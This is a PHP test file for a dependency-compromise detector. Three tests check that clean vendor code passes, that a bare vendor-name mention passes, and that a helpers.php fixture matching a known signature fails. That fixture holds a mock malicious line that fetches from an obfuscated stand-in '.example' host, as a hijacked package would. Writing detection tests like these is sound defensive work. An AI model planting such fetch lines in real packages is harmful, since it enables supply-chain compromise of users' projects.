<?php

use Checkpoint\Checks\CheckResult;
use Checkpoint\Checks\CompromisedDependencyCheck;

it('passes on a clean vendor tree', function () {
    $base = tempProject([
        'vendor/acme/widget/src/helpers.php' => "<?php\n\nfunction widget_helper() { return true; }\n",
    ]);

    expect((new CompromisedDependencyCheck($base))->run()->status)->toBe(CheckResult::PASS);
});

it('passes when only one marker is present (avoids false positives)', function () {
    // A legitimately named package referencing the vendor string, but no payload.
    $base = tempProject([
        'vendor/flipboxstudio/widget/src/helpers.php' => "<?php\n\n// flipboxstudio helper library\nfunction fb_helper() { return true; }\n",
    ]);

    expect((new CompromisedDependencyCheck($base))->run()->status)->toBe(CheckResult::PASS);
});

it('fails when a vendor helpers.php matches a known compromise signature', function () {
    $base = tempProject([
        'vendor/laravel-lang/lang/src/helpers.php' => "<?php\n\n\$p = file_get_contents('https://'.chr(102).'.flipboxstudio.example/c');\n",
    ]);

    expect((new CompromisedDependencyCheck($base))->run()->status)->toBe(CheckResult::FAIL)
        ->and((new CompromisedDependencyCheck($base))->run()->details)->not->toBeEmpty();
});
